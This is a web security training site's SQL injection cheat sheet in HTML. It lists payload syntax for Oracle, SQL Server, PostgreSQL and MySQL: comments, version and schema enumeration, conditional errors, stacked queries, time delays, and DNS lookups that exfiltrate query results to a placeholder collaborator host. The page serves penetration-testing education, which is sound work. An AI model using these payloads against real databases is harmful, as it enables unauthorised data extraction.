@@ -1,0 +1,1131 @@
+<!DOCTYPE html>
+<html>
+    <head>
+            <script nonce="q1sAw0Ucd7DBK&#x2B;Lj8dhBRnM/085O7Joy">
+        (function (w, d, s, l, i) {
+            w[l] = w[l] || [];
+            w[l].push({
+                'gtm.start':
+                    new Date().getTime(), event: 'gtm.js'
+            });
+            var f = d.getElementsByTagName(s)[0],
+                j = d.createElement(s), dl = l != 'dataLayer' ? '&l=' + l : '';
+            j.async = true;
+            j.src =
+                'https://www.googletagmanager.com/gtm.js?id=' + i + dl;
+            f.parentNode.insertBefore(j, f);
+        })(window, document, 'script', 'dataLayer', 'GTM-M4CF4TD');
+    </script>
+
+        <meta charset="utf-8">
+        <meta content="IE=edge" http-equiv="X-UA-Compatible">
+        <meta content="width=device-width, initial-scale=1" name="viewport">
+        <title>SQL injection cheat sheet | Web Security Academy</title>
+        <meta name="description" content="This SQL injection cheat sheet contains examples of useful syntax that you can use to perform a variety of tasks that often arise when performing SQL ...">
+        
+<script nonce="q1sAw0Ucd7DBK+Lj8dhBRnM/085O7Joy">
+    const dimensionName = "dimension2";
+    const userRef = "86766C50385C987412BD90C2D665137C";
+</script>
+
+        <!-- Twitter data -->
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="SQL injection cheat sheet | Web Security Academy">
+    <meta name="twitter:description" content="This SQL injection cheat sheet contains examples of useful syntax that you can use to perform a variety of tasks that often arise when performing SQL ...">
+<meta name="twitter:image" content="https://portswigger.net/content/images/logos/academy-twittercard.png">
+    <meta name="twitter:site" content="@WebSecAcademy">
+
+<!-- Open Graph data -->
+<meta property="og:title" content="SQL injection cheat sheet | Web Security Academy" />
+    <meta property="og:description" content="This SQL injection cheat sheet contains examples of useful syntax that you can use to perform a variety of tasks that often arise when performing SQL ...">
+<meta property="og:url" content="https://portswigger.net/web-security/sql-injection/cheat-sheet" />
+<meta property="og:image" content="https://portswigger.net/content/images/logos/academy-twittercard.png"/>
+<meta property="og:type" content="website"/>
+<link rel="canonical" href="https://portswigger.net/web-security/sql-injection/cheat-sheet" />
+<link rel="icon" href="/content/images/logos/favicon.ico" type="image/x-icon" />
+<link rel="apple-touch-icon" href="/content/images/logos/apple-touch-icon.png">
+        <link href="/content/psacademy.css" rel="stylesheet" type="text/css">
+        <link rel="preload" href="/content/fonts/ps-icons-small/ps-icons-small.woff?td2uot" as="font" crossorigin="anonymous">
+<link rel="preload" href="/content/fonts/ps-main/ps-icons.woff?l1la2n" as="font" crossorigin="anonymous">
+    </head>
+    <body class="theme-">
+        
+
+
+        <header class="page-header" id="top">
+            <div class="container">
+    <a class="logo" href="/"></a>
+    <div class="header-right">
+        <div class="login-buttons">
+                <a class="logout" href="/users/logout">Log out</a>
+                <a class="button-orange-small" href="/users/youraccount">My account</a>
+        </div>
+
+
+    <input type="checkbox" id="hamburger-mobile" class="hamburger-input-mobile">
+    <input type="radio" id="hamburger-desktop" class="hamburger-input-desktop" name="mega-nav-input">
+    <div class="hamburger-menu-mobile">
+        <label class="hamburger-menu-label header-hidden" for="hamburger-mobile" init-ga-click data-ga-click-label="hamburger-mobile">
+            <span class="hamburger-layers"></span>
+        </label>
+    </div>
+    <div class="mega-nav">
+        <input type="radio" id="mega-nav-close" class="mega-nav-input-close" name="mega-nav-input">
+        <input type="radio" id="mega-nav-label-1" class="mega-nav-input-1" name="mega-nav-input">
+        <input type="radio" id="mega-nav-label-2" class="mega-nav-input-2" name="mega-nav-input">
+        <input type="radio" id="mega-nav-label-6" class="mega-nav-input-6" name="mega-nav-input">
+        <input type="radio" id="mega-nav-label-7" class="mega-nav-input-7" name="mega-nav-input">
+
+        <label for="mega-nav-close" class="mega-nav-close"></label>
+
+        <label class="mega-nav-label mega-nav-label-1" for="mega-nav-label-1" init-ga-click data-ga-click-label="products">
+            <span class="mega-nav-text">Products</span>
+            <span class="icon-arrow-head-down"></span>
+        </label>
+        <label class="mega-nav-label mega-nav-label-2" for="mega-nav-label-2" init-ga-click data-ga-click-label="solutions">
+            <span class="mega-nav-text">Solutions</span>
+            <span class="icon-arrow-head-down"></span>
+        </label>
+        <a init-ga-click data-ga-click-label="research" class="mega-nav-link" href="/research"><span class="mega-nav-text">Research</span></a>
+        <a init-ga-click data-ga-click-label="academy" class="mega-nav-link" href="/web-security"><span class="mega-nav-text">Academy</span></a>
+        <a init-ga-click data-ga-click-label="dailyswig" class="mega-nav-link" href="/daily-swig"><span class="mega-nav-text">Daily Swig</span></a>
+        <label init-ga-click data-ga-click-label="support" class="mega-nav-label mega-nav-label-6" for="mega-nav-label-6">
+            <span class="mega-nav-text">Support</span>
+            <span class="icon-arrow-head-down"></span>
+        </label>
+
+        <label class="mega-nav-label mega-nav-label-7 header-hidden" for="mega-nav-label-7" init-ga-click data-ga-click-label="company">
+            <span class="mega-nav-text">Company</span>
+            <span class="icon-arrow-head-down"></span>
+        </label>
+        <div class="hamburger-menu-desktop">
+            <label class="hamburger-menu-label header-show" for="hamburger-desktop" init-ga-click data-ga-click-label="hamburger-desktop">
+                <span class="hamburger-layers"></span>
+            </label>
+            <div>
+                <a class="hamburger-menu-desktop-link hamburger-menu-desktop-link-1" href="/customers" init-ga-click data-ga-click-label="customers"><span class="mega-nav-text">Customers</span></a>
+                <a class="hamburger-menu-desktop-link hamburger-menu-desktop-link-3" href="/about" init-ga-click data-ga-click-label="about"><span class="mega-nav-text">About</span></a>
+                <a class="hamburger-menu-desktop-link hamburger-menu-desktop-link-4" href="/blog" init-ga-click data-ga-click-label="blog"><span class="mega-nav-text">Blog</span></a>
+                <a class="hamburger-menu-desktop-link hamburger-menu-desktop-link-5" href="/careers" init-ga-click data-ga-click-label="careers"><span class="mega-nav-text">Careers</span></a>
+                <a class="hamburger-menu-desktop-link hamburger-menu-desktop-link-6" href="/legal" init-ga-click data-ga-click-label="legal"><span class="mega-nav-text">Legal</span></a>
+                <a class="hamburger-menu-desktop-link hamburger-menu-desktop-link-7" href="/contact" init-ga-click data-ga-click-label="contact"><span class="mega-nav-text">Contact</span></a>
+                <a class="hamburger-menu-desktop-link hamburger-menu-desktop-link-8" href="/support/reseller-faqs" init-ga-click data-ga-click-label="contact"><span class="mega-nav-text">Resellers</span></a>
+            </div>
+        </div>
+
+        <a class="mega-nav-link header-hidden" href="/users/youraccount" init-ga-click data-ga-click-label="login-mobile"><span class="mega-nav-text">My account</span></a>
+        <a class="hamburger-menu-link hamburger-menu-link-1" href="/customers" init-ga-click data-ga-click-label="customers"><span class="mega-nav-text">Customers</span></a>
+        <a class="hamburger-menu-link hamburger-menu-link-3" href="/about" init-ga-click data-ga-click-label="about"><span class="mega-nav-text">About</span></a>
+        <a class="hamburger-menu-link hamburger-menu-link-4" href="/blog" init-ga-click data-ga-click-label="blog"><span class="mega-nav-text">Blog</span></a>
+        <a class="hamburger-menu-link hamburger-menu-link-5" href="/careers" init-ga-click data-ga-click-label="careers"><span class="mega-nav-text">Careers</span></a>
+        <a class="hamburger-menu-link hamburger-menu-link-6" href="/legal" init-ga-click data-ga-click-label="legal"><span class="mega-nav-text">Legal</span></a>
+        <a class="hamburger-menu-link hamburger-menu-link-7" href="/contact" init-ga-click data-ga-click-label="contact"><span class="mega-nav-text">Contact</span></a>
+        <a class="hamburger-menu-link hamburger-menu-link-8" href="/support/reseller-faqs" init-ga-click data-ga-click-label="contact"><span class="mega-nav-text">Resellers</span></a>
+
+        <div class="mega-nav-container">
+
+            <div class="mega-nav-content mega-nav-content-1">
+                <div class="section-white-medium-no-padding">
+                    <div class="container-columns-66-percent-right">
+                        <div>
+                            <a href="/burp/enterprise" class="link-block-white" init-ga-click data-ga-click-label="product-enterprise">
+                                <img src="/content/images/svg/icons/enterprise.svg" alt="Burp Suite Enterprise Edition">
+                                <span><strong>Burp Suite Enterprise Edition</strong></span>
+                                <span>The enterprise-enabled dynamic web vulnerability scanner.</span>
+                            </a>
+
+                            <a href="/burp/pro" class="link-block-white" init-ga-click data-ga-click-label="product-pro">
+                                <img src="/content/images/svg/icons/professional.svg" alt="Burp Suite Professional">
+                                <span><strong>Burp Suite Professional</strong></span>
+                                <span>The world's #1 web penetration testing toolkit.</span>
+                            </a>
+
+                            <a href="/burp/communitydownload" class="link-block-white" init-ga-click data-ga-click-label="product-community">
+                                <img src="/content/images/svg/icons/community.svg" alt="Burp Suite Community Edition">
+                                <span><strong>Burp Suite Community Edition</strong></span>
+                                <span>The best manual tools to start web security testing.</span>
+                            </a>
+
+                            <a href="/burp/dastardly" class="link-block-white" init-ga-click data-ga-click-label="product-community">
+                                <img src="/mega-nav/images/dastardly.svg" alt="Dastardly, from Burp Suite">
+                                <span><strong>Dastardly, from Burp Suite</strong></span>
+                                <span>Free, lightweight web application security scanning for CI/CD.</span>
+                            </a>
+
+                            <a href="/burp" class="chevron-after" init-ga-click data-ga-click-label="products-all">View all product editions</a>
+                        </div>
+
+                        <div>
+                            <div class="container-cards-lists-white">
+                                <a href="/burp/account-and-subscription-management" init-ga-click data-ga-click-label="feature-how-to-buy-burp-suite">
+                                    <p><strong>Account and subscription management</strong></p>
+                                    <p>Information on ordering, pricing, and more.</p>
+                                    <img src="/mega-nav/images/tailored-quote.png" alt="Burp Suite Professional vs Burp Suite Enterprise Edition">
+                                </a>
+                            </div>
+
+                        </div>
+
+
+                    </div>
+                </div>
+            </div>
+
+            <div class="mega-nav-content mega-nav-content-2">
+                <div class="section-white-medium-no-padding">
+                    <div class="container-columns-66-percent-right">
+                        <div>
+                            <div class="container-columns">
+                                <a href="/solutions" class="link-block-white" init-ga-click data-ga-click-label="solutions-application-testing">
+                                    <span><strong>Application Security Testing</strong></span>
+                                    <span>See how our software enables the world to secure the web.</span>
+                                </a>
+                                <a href="/solutions/devsecops" class="link-block-white" init-ga-click data-ga-click-label="solutions-devsecops">
+                                    <span><strong>DevSecOps</strong></span>
+                                    <span>Catch critical bugs; ship more secure software, more quickly.</span>
+                                </a>
+
+                                <a href="/solutions/penetration-testing" class="link-block-white" init-ga-click data-ga-click-label="solutions-penetration-testing">
+                                    <span><strong>Penetration Testing</strong></span>
+                                    <span>Accelerate penetration testing - find more bugs, more quickly.</span>
+                                </a>
+                                <a href="/solutions/automated-security-testing" class="link-block-white" init-ga-click data-ga-click-label="solutions-automated-penetration-testing">
+                                    <span><strong>Automated Scanning</strong></span>
+                                    <span>Scale dynamic scanning. Reduce risk. Save time/money.</span>
+                                </a>
+
+                                <a href="/solutions/bug-bounty-hunting" class="link-block-white" init-ga-click data-ga-click-label="solutions-bug-bounty-software">
+                                    <span><strong>Bug Bounty Hunting</strong></span>
+                                    <span>Level up your hacking and earn more bug bounties.</span>
+                                </a>
+                                <a href="/solutions/compliance" class="link-block-white" init-ga-click data-ga-click-label="solutions-compliance">
+                                    <span><strong>Compliance</strong></span>
+                                    <span>Enhance security monitoring to comply with confidence.</span>
+                                </a>
+                            </div>
+                            <a href="/solutions" class="chevron-after" init-ga-click data-ga-click-label="solutions-all">View all solutions</a>
+                        </div>
+
+                        <div>
+                            <div class="container-cards-lists-white">
+                                <a href="/burp/enterprise/resources/enterprise-edition-vs-professional" init-ga-click data-ga-click-label="feature-product-burp-comparison">
+                                    <p><strong>Product comparison</strong></p>
+                                    <p>What's the difference between Pro and Enterprise Edition?</p>
+                                    <img src="/mega-nav/images/burp-suite.jpg" alt="Burp Suite Professional vs Burp Suite Enterprise Edition">
+                                </a>
+                            </div>
+
+                        </div>
+
+
+                    </div>
+                </div>
+            </div>
+
+            <div class="mega-nav-content mega-nav-content-6">
+                <div class="section-white-medium-no-padding">
+                    <div class="container-columns-66-percent-right">
+                        <div>
+                            <div class="container-columns">
+                                <a href="/support" class="link-block-white" init-ga-click data-ga-click-label="support-center">
+                                    <span><strong>Support Center</strong></span>
+                                    <span>Get help and advice from our experts on all things Burp.</span>
+                                </a>
+                                <a href="/burp/documentation" class="link-block-white" init-ga-click data-ga-click-label="support-documentation">
+                                    <span><strong>Documentation</strong></span>
+                                    <span>Tutorials and guides for Burp Suite.</span>
+                                </a>
+                                <a href="/burp/documentation/desktop/getting-started" class="link-block-white" init-ga-click data-ga-click-label="support-get-started-professional">
+                                    <span><strong>Get Started - Professional</strong></span>
+                                    <span>Get started with Burp Suite Professional.</span>
+                                </a>
+                                <a href="/burp/documentation/enterprise/getting-started" class="link-block-white" init-ga-click data-ga-click-label="support-get-started-enterprise">
+                                    <span><strong>Get Started - Enterprise</strong></span>
+                                    <span>Get started with Burp Suite Enterprise Edition.</span>
+                                </a>
+                                <a href="https://forum.portswigger.net/" class="link-block-white" init-ga-click data-ga-click-label="support-user-forum">
+                                    <span><strong>User Forum</strong></span>
+                                    <span>Get your questions answered in the User Forum.</span>
+                                </a>
+                                <a href="/burp/releases" class="link-block-white" init-ga-click data-ga-click-label="support-releases">
+                                    <span><strong>Downloads</strong></span>
+                                    <span>Download the latest version of Burp Suite.</span>
+                                </a>
+                            </div>
+                            <a href="/support" class="chevron-after" init-ga-click data-ga-click-label="support-all">Visit the Support Center</a>
+                        </div>
+
+                        <div>
+                            <div class="container-cards-lists-white">
+                                <a href="/burp/releases" init-ga-click data-ga-click-label="feature-burp-software-downloads">
+                                    <p><strong>Downloads</strong></p>
+                                    <p>Download the latest version of Burp Suite.</p>
+                                    <img src="/mega-nav/images/latest-burp-suite-software-download.jpg" alt="The latest version of Burp Suite software for download">
+                                </a>
+                            </div>
+
+                        </div>
+
+
+                    </div>
+                </div>
+            </div>
+
+        </div>
+
+    </div>
+
+    </div>
+</div>
+        </header>
+        
+
+
+
+
+            <nav class="navigation-top">
+                <input type="checkbox" id="nav-main-enterprise">
+                <label for="nav-main-enterprise">
+                    <span>Academy home</span>
+                    <span class="icon-arrow-head-down"></span>
+                </label>
+                <ul>
+                    <li><a href="https://portswigger.net/web-security/index.html">Dashboard</a></li>
+                    <li><a href="https://portswigger.net/web-security/learning-path/index.html">Learning path</a></li>
+                    <li>
+                        <input type="checkbox" id="nav-main-academy-topics">
+                        <label for="nav-main-academy-topics">
+                            <span>Latest topics</span>
+                            <span class="icon-arrow-head-down"></span>
+                        </label>
+                        <div>
+                            <a href="/web-security/prototype-pollution/server-side">Server-side prototype pollution</a>
+                            <a href="/web-security/csrf/bypassing-samesite-restrictions">Bypassing SameSite restrictions</a>
+                            <a href="/web-security/prototype-pollution/client-side">Client-side prototype pollution</a>
+                            <a href="/web-security/essential-skills">Essential skills</a>
+                            <a href="/web-security/request-smuggling/browser">Browser-powered request smuggling</a>
+                            <a href="/web-security/all-materials">View all topics</a>
+                        </div>
+                    </li>
+                    <li><a href="/web-security/all-labs">All labs</a></li>
+                    <li><a href="/web-security/mystery-lab-challenge">Mystery labs</a></li>
+                    <li>
+                        <input type="checkbox" id="nav-main-academy-hall-of-fame">
+                        <label for="nav-main-academy-hall-of-fame">
+                            <span>Hall of Fame</span>
+                            <span class="icon-arrow-head-down"></span>
+                        </label>
+                        <div>
+                            <a href="https://portswigger.net/web-security/hall-of-fame">Leaderboard</a>
+                            <a href="https://portswigger.net/web-security/getting-started/kamil-vavra/index.html">Interview - Kamil Vavra</a>
+                            <a href="https://portswigger.net/web-security/getting-started/johnny-villarreal/index.html">Interview - Johnny Villarreal</a>
+                            <a href="https://portswigger.net/web-security/getting-started/andres-rauschecker/index.html">Interview - Andres Rauschecker</a>
+                        </div>
+                    </li>
+                    <li><a href="https://portswigger.net/web-security/getting-started/index.html">Get started</a></li>
+                    <li>
+                        <input type="checkbox" id="nav-main-academy-certification">
+                        <label for="nav-main-academy-certification">
+                             <span>Get certified</span>
+                             <span class="icon-arrow-head-down"></span>
+                        </label>
+                        <div>
+                             <a href="https://portswigger.net/web-security/certification/index.html">Get certified</a>
+                             <a href="https://portswigger.net/web-security/certification/how-to-prepare/index.html">How to prepare</a>
+                             <a href="https://portswigger.net/web-security/certification/how-it-works/index.html">How it works</a>
+                             <a href="https://portswigger.net/web-security/certification/practice-exam/index.html">Practice exam</a>
+                             <a href="https://portswigger.net/web-security/certification/exam-hints-and-guidance/index.html">Exam hints and guidance</a>
+                             <a href="https://portswigger.net/web-security/certification/how-it-works/index.html#what-the-exam-involves">What the exam involves</a>
+                             <a href="https://portswigger.net/web-security/certification/frequently-asked-questions/index.html">FAQs</a>
+                             <a href="https://portswigger.net/web-security/certification#validate-your-certification">Validate your certification</a>
+                        </div>
+                    </li>
+                </ul>
+            </nav>
+        <ol class="container ps-breadcrumbs" itemscope itemtype="http://schema.org/BreadcrumbList"><li itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem"><a itemscope itemtype="http://schema.org/Thing" itemprop="item" href="/web-security"><span itemprop="name">Web Security Academy</span></a><meta itemprop="position" content="1" /></li><li itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem"><a itemscope itemtype="http://schema.org/Thing" itemprop="item" href="/web-security/sql-injection"><span itemprop="name">SQL injection</span></a><meta itemprop="position" content="2" /></li><li itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem"><a itemscope itemtype="http://schema.org/Thing" itemprop="item" href="/web-security/sql-injection/cheat-sheet"><span itemprop="name">Cheat sheet</span></a><meta itemprop="position" content="3" /></li></ol>        <section class="maincontainer">
+                <div class="container is-flex">
+                    <div class="maincol">
+                        
+    <h1>SQL injection cheat sheet</h1>
+
+
+<p>
+            This <a href="/web-security/sql-injection">SQL injection</a> cheat sheet contains examples of useful syntax that you can use to perform a variety of tasks that often arise when performing SQL injection attacks.
+        </p>
+        <h2 id="string-concatenation">String concatenation</h2>
+        <p>
+            You can concatenate together multiple strings to make a single string.
+        </p>
+        <table class="is-nonresponsive-table">
+            <tr>
+                <th>
+                    Oracle
+                </th>
+                <td><code>
+                    'foo'||'bar'
+                </code></td>
+            </tr>
+            <tr>
+                <th>
+                    Microsoft
+                </th>
+                <td><code>
+                    'foo'+'bar'
+                </code></td>
+            </tr>
+            <tr>
+                <th>
+                    PostgreSQL
+                </th>
+                <td><code>
+                    'foo'||'bar'
+                </code></td>
+            </tr>
+            <tr>
+                <th>
+                    MySQL
+                </th>
+                <td>
+                    <code>'foo' 'bar'</code> [Note the space between the two strings]<br>
+                    <code>CONCAT('foo','bar')</code><br>
+                </td>
+            </tr>
+        </table>
+        <h2 id="substring">Substring</h2>
+        <p>
+            You can extract part of a string, from a specified offset with a specified length. Note that the offset index is 1-based. Each of the following expressions will return the string <code>ba</code>.
+        </p>
+        <table class="is-nonresponsive-table">
+            <tr>
+                <th>
+                    Oracle
+                </th>
+                <td><code>
+SUBSTR('foobar', 4, 2)
+                </code></td>
+            </tr>
+            <tr>
+                <th>
+                    Microsoft
+                </th>
+                <td><code>
+SUBSTRING('foobar', 4, 2)
+                </code></td>
+            </tr>
+            <tr>
+                <th>
+                    PostgreSQL
+                </th>
+                <td><code>
+SUBSTRING('foobar', 4, 2)
+                </code></td>
+            </tr>
+            <tr>
+                <th>
+                    MySQL
+                </th>
+                <td><code>
+SUBSTRING('foobar', 4, 2)
+                </code></td>
+            </tr>
+        </table>        <h2 id="comments">Comments</h2>
+        <p>
+            You can use comments to truncate a query and remove the portion of the original query that follows your input.
+        </p>
+        <table class="is-nonresponsive-table">
+            <tr>
+                <th>
+                    Oracle
+                </th>
+                <td><code>
+                    --comment<br>
+                </code></td>
+            </tr>
+            <tr>
+                <th>
+                    Microsoft
+                </th>
+                <td><code>
+                    --comment<br>
+                    /*comment*/
+                </code></td>
+            </tr>
+            <tr>
+                <th>
+                    PostgreSQL
+                </th>
+                <td><code>
+                    --comment<br>
+                    /*comment*/
+                </code></td>
+            </tr>
+            <tr>
+                <th>
+                    MySQL
+                </th>
+                <td>
+                    <code>#comment</code><br>
+                    <code>-- comment</code> [Note the space after the double dash]<br>
+                    <code>/*comment*/</code>
+                </td>
+            </tr>
+        </table>
+        <h2 id="database-version">Database version</h2>
+        <p>
+            You can query the database to determine its type and version. This information is useful when formulating more complicated attacks.
+        </p>
+        <table class="is-nonresponsive-table">
+            <tr>
+                <th>
+                    Oracle
+                </th>
+                <td><code>
+                    SELECT banner FROM v$version<br>
+                    SELECT version FROM v$instance<br>
+                </code></td>
+            </tr>
+            <tr>
+                <th>
+                    Microsoft
+                </th>
+                <td><code>
+                    SELECT @@version
+                </code></td>
+            </tr>
+            <tr>
+                <th>
+                    PostgreSQL
+                </th>
+                <td><code>
+                    SELECT version()
+                </code></td>
+            </tr>
+            <tr>
+                <th>
+                    MySQL
+                </th>
+                <td><code>
+                    SELECT @@version
+                </code></td>
+            </tr>
+        </table>
+        <h2 id="database-contents">Database contents</h2>
+        <p>
+            You can list the tables that exist in the database, and the columns that those tables contain.
+        </p>
+        <table class="is-nonresponsive-table">
+            <tr>
+                <th>
+                    Oracle
+                </th>
+                <td><code>
+                    SELECT * FROM all_tables<br>
+                    SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'
+                </code></td>
+            </tr>
+            <tr>
+                <th>
+                    Microsoft
+                </th>
+                <td><code>
+                    SELECT * FROM information_schema.tables<br>
+                    SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'<br>
+                </code></td>
+            </tr>
+            <tr>
+                <th>
+                    PostgreSQL
+                </th>
+                <td><code>
+                    SELECT * FROM information_schema.tables<br>
+                    SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'<br>
+                </code></td>
+            </tr>
+            <tr>
+                <th>
+                    MySQL
+                </th>
+                <td><code>
+                    SELECT * FROM information_schema.tables<br>
+                    SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'<br>
+                </code></td>
+            </tr>
+        </table>
+        <h2 id="conditional-errors">Conditional errors</h2>
+        <p>
+            You can test a single boolean condition and trigger a database error if the condition is true.
+        </p>
+        <table class="is-nonresponsive-table">
+            <tr>
+                <th>
+                    Oracle
+                </th>
+                <td><code>
+                    SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN TO_CHAR(1/0) ELSE NULL END FROM dual
+                </code></td>
+            </tr>
+            <tr>
+                <th>
+                    Microsoft
+                </th>
+                <td><code>
+                    SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END
+                </code></td>
+            </tr>
+            <tr>
+                <th>
+                    PostgreSQL
+                </th>
+                <td><code>
+                    1 = (SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/(SELECT 0) ELSE NULL END)
+                </code></td>
+            </tr>
+            <tr>
+                <th>
+                    MySQL
+                </th>
+                <td><code>
+                    SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a')
+                </code></td>
+            </tr>
+        </table>
+        <h2 id="batched-or-stacked-queries">Batched (or stacked) queries</h2>
+        <p>
+            You can use batched queries to execute multiple queries in succession. Note that while the subsequent queries are executed, the results are not returned to the application. Hence this technique is primarily of use in relation to blind vulnerabilities where you can use a second query to trigger a DNS lookup, conditional error, or time delay.
+        </p>
+        <table class="is-nonresponsive-table">
+            <tr>
+                <th>
+                    Oracle
+                </th>
+                <td><code>
+                    Does not support batched queries.
+                </code></td>
+            </tr>
+            <tr>
+                <th>
+                    Microsoft
+                </th>
+                <td><code>
+                    QUERY-1-HERE; QUERY-2-HERE
+                </code></td>
+            </tr>
+            <tr>
+                <th>
+                    PostgreSQL
+                </th>
+                <td><code>
+                    QUERY-1-HERE; QUERY-2-HERE
+                </code></td>
+            </tr>
+            <tr>
+                <th>
+                    MySQL
+                </th>
+                <td><code>
+                    QUERY-1-HERE; QUERY-2-HERE
+                </code></td>
+            </tr>
+        </table>
+        <div class="component-notes">
+            <h4>Note</h4>
+            <p>
+                With MySQL, batched queries typically cannot be used for SQL injection. However, this is occasionally possible if the target application uses certain PHP or Python APIs to communicate with a MySQL database.
+            </p>
+        </div>
+        <h2 id="time-delays">Time delays</h2>
+        <p>
+            You can cause a time delay in the database when the query is processed. The following will cause an unconditional time delay of 10 seconds.
+        </p>
+        <table class="is-nonresponsive-table">
+            <tr>
+                <th>
+                    Oracle
+                </th>
+                <td><code>
+                    dbms_pipe.receive_message(('a'),10)
+                </code></td>
+            </tr>
+            <tr>
+                <th>
+                    Microsoft
+                </th>
+                <td><code>
+                    WAITFOR DELAY '0:0:10'
+                </code></td>
+            </tr>
+            <tr>
+                <th>
+                    PostgreSQL
+                </th>
+                <td><code>
+                    SELECT pg_sleep(10)
+                </code></td>
+            </tr>
+            <tr>
+                <th>
+                    MySQL
+                </th>
+                <td><code>
+                    SELECT SLEEP(10)
+                </code></td>
+            </tr>
+        </table>
+        <h2 id="conditional-time-delays">Conditional time delays</h2>
+        <p>
+            You can test a single boolean condition and trigger a time delay if the condition is true.
+        </p>
+        <table class="is-nonresponsive-table">
+            <tr>
+                <th>
+                    Oracle
+                </th>
+                <td><code>
+                    SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual
+                </code></td>
+            </tr>
+            <tr>
+                <th>
+                    Microsoft
+                </th>
+                <td><code>
+                    IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10'
+                </code></td>
+            </tr>
+            <tr>
+                <th>
+                    PostgreSQL
+                </th>
+                <td><code>
+                    SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END
+                </code></td>
+            </tr>
+            <tr>
+                <th>
+                    MySQL
+                </th>
+                <td><code>
+                    SELECT IF(YOUR-CONDITION-HERE,SLEEP(10),'a')
+                </code></td>
+            </tr>
+        </table>
+        <h2 id="dns-lookup">DNS lookup</h2>
+        <p>
+            You can cause the database to perform a DNS lookup to an external domain. To do this, you will need to use <a href="/burp/documentation/desktop/tools/collaborator">Burp Collaborator</a> to generate a unique Burp Collaborator subdomain that you will use in your attack, and then poll the Collaborator server to confirm that a DNS lookup occurred.
+        </p>
+        <table class="is-nonresponsive-table">
+            <tr>
+                <th>
+                    Oracle
+                </th>
+                <td>
+                    The following technique leverages an XML external entity (<a href="/web-security/xxe">XXE</a>) vulnerability to trigger a DNS lookup. The vulnerability has been patched but there are many unpatched Oracle installations in existence:<br>
+                    <code>SELECT EXTRACTVALUE(xmltype('&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;!DOCTYPE root [ &lt;!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"&gt; %remote;]&gt;'),'/l') FROM dual</code><br>
+                    <br>
+                    The following technique works on fully patched Oracle installations, but requires elevated privileges:<br>
+                    <code>SELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN')</code>
+                </td>
+            </tr>
+            <tr>
+                <th>
+                    Microsoft
+                </th>
+                <td><code>
+                    exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a'
+                </code></td>
+            </tr>
+            <tr>
+                <th>
+                    PostgreSQL
+                </th>
+                <td><code>
+                    copy (SELECT '') to program 'nslookup BURP-COLLABORATOR-SUBDOMAIN'
+                </code></td>
+            </tr>
+            <tr>
+                <th>
+                    MySQL
+                </th>
+                <td>
+                    The following techniques work on Windows only:<br>
+                    <code>LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a')</code><br>
+                    <code>SELECT ... INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'</code>
+                </td>
+            </tr>
+        </table>
+        <h2 id="dns-lookup-with-data-exfiltration">DNS lookup with data exfiltration</h2>
+        <p>
+            You can cause the database to perform a DNS lookup to an external domain containing the results of an injected query. To do this, you will need to use <a href="/burp/documentation/desktop/tools/collaborator">Burp Collaborator</a> to generate a unique Burp Collaborator subdomain that you will use in your attack, and then poll the Collaborator server to retrieve details of any DNS interactions, including the exfiltrated data.
+        </p>
+        <table class="is-nonresponsive-table">
+            <tr>
+                <th>
+                    Oracle
+                </th>
+                <td><code>
+                    SELECT EXTRACTVALUE(xmltype('&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;!DOCTYPE root [ &lt;!ENTITY % remote SYSTEM "http://'||(SELECT YOUR-QUERY-HERE)||'.BURP-COLLABORATOR-SUBDOMAIN/"&gt; %remote;]&gt;'),'/l') FROM dual
+                </code></td>
+            </tr>
+            <tr>
+                <th>
+                    Microsoft
+                </th>
+                <td><code>
+                    declare @p varchar(1024);set @p=(SELECT YOUR-QUERY-HERE);exec('master..xp_dirtree "//'+@p+'.BURP-COLLABORATOR-SUBDOMAIN/a"')
+                </code></td>
+            </tr>
+            <tr>
+                <th>
+                    PostgreSQL
+                </th>
+                <td><code>
+                    create OR replace function f() returns void as $$<br>
+                    declare c text;<br>
+                    declare p text;<br>
+                    begin<br>
+                    SELECT into p (SELECT YOUR-QUERY-HERE);<br>
+                    c := 'copy (SELECT '''') to program ''nslookup '||p||'.BURP-COLLABORATOR-SUBDOMAIN''';<br>
+                    execute c;<br>
+                    END;<br>
+                    $$ language plpgsql security definer;<br>
+                    SELECT f();
+                </code></td>
+            </tr>
+            <tr>
+                <th>
+                    MySQL
+                </th>
+                <td>
+                    The following technique works on Windows only:<br>
+                    <code>SELECT YOUR-QUERY-HERE INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'</code>
+                </td>
+            </tr>
+        </table>
+
+
+                    </div>
+                    <div class="rightcol rightcol-boxes">
+                        
+	    
+<input class="hidden" id="trackerpopup" type="checkbox">
+<div class="widgetcontainer-box is-twobtns academy-account-status" id="AcademyAccountStatusWidget">
+        <div class="flex">
+            <label class="open-progress visible-when-collapsed" for="trackerpopup" id="open-progress">&nbsp;</label>
+            <label class="close-progress hidden-when-collapsed" for="trackerpopup" id="close-progress">&nbsp;</label>
+            <svg class="expand-arrow" height="10" viewBox="0 0 17 10" width="17" xmlns="http://www.w3.org/2000/svg">
